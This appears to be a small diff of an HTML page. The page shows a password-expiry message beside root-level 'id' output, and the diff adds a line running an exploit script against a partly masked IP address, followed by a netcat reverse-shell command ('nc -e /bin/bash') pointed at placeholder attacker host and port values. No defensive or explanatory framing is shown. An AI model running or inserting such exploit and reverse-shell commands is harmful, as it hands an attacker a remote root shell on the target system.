@@ -9,3 +9,5 @@
 &lt;p&gt;Your password has expired, and a new one must be chosen.<br>
 <strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
 &lt;/p&gt;
+
+<code>python3 exploit.py 1**.2*.*.*** nc -e /bin/bash [LHOST] [LPORT] </code>
